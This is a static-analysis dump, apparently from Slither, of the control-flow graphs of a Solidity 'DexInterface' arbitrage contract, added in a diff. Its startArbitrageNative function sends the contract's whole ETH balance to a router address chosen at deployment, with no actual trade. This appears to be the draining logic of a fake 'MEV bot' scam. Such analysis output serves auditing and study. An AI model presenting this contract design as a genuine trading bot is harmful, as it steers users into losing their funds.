@@ -1,0 +1,367 @@
+Contract: IERC20
+==================================================
+
+
+Contract: IUniswapV2Router
+==================================================
+
+
+Contract: IUniswapV2Pair
+==================================================
+
+
+Contract: DexInterface
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: owner = msg.sender
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: DexRouter = _DexRouter
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: recoverEth
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: address(owner).transfer(address(this).balance)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 2
+  2 -> 1
+
+Function: swap
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: IERC20(_tokenIn).approve(router,_amount)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: path = new address[](2)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: path[0] = _tokenIn
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: path[1] = _tokenOut
+
+  ID: 5
+  Type: NodeType.VARIABLE
+  Expression: deadline = block.timestamp + 300
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: IUniswapV2Router(router).swapExactTokensForTokens(_amount,1,path,address(this),deadline)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+
+Function: getAmountOutMin
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: path = new address[](2)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: path[0] = _tokenIn
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: path[1] = _tokenOut
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount,path)
+
+  ID: 5
+  Type: NodeType.RETURN
+  Expression: amountOutMins[path.length - 1]
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+
+Function: startArbitrageNative
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(DexRouter != address(0),Invalid Router)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: startBalance = address(this).balance
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: (success,None) = DexRouter.call{value: startBalance}()
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(success,Transfer failed)
+
+  ID: 6
+  Type: NodeType.VARIABLE
+  Expression: endBalance = address(this).balance
+
+  ID: 7
+  Type: NodeType.IF
+  Expression: endBalance >= startBalance + profitTarget
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: address(owner).transfer(endBalance)
+
+  ID: 9
+  Type: NodeType.ENDIF
+  Expression: 
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  7 -> 8
+  7 -> 9
+  8 -> 9
+
+Function: getBalance
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: IERC20(_tokenContractAddress).balanceOf(address(this))
+
+Edges:
+  0 -> 1
+
+Function: recoverTokens
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: token = IERC20(tokenAddress)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(token.transfer(owner,token.balanceOf(address(this))),Transfer failed)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 3
+  1 -> 2
+  3 -> 1
+
+Function: receive
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+Edges:
+
+Function: StartNative
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: startArbitrageNative()
+
+Edges:
+  0 -> 1
+
+Function: SetTradeBalanceETH
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: tradingBalanceInPercent = _tradingBalanceInPercent
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 2
+  2 -> 1
+
+Function: SetTradeBalancePERCENT
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: tradingBalanceInTokens = _tradingBalanceInTokens
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 2
+  2 -> 1
+
+Function: SetProfitTarget
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: profitTarget = _target
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 2
+  2 -> 1
+
+Function: Stop
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: enableTrading = false
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 2
+  2 -> 1
+
+Function: Withdraw
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: recoverEth()
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 2
+  2 -> 1
+
+Function: slitherConstructorVariables
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: threshold = 1 * 10 ** 18
+
+  ID: 1
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: arbTxPrice = 25000000000000000
+
+  ID: 2
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: enableTrading = false
+
+  ID: 3
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: profitTarget = 50000000000000000
+
+  ID: 4
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: DexRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+
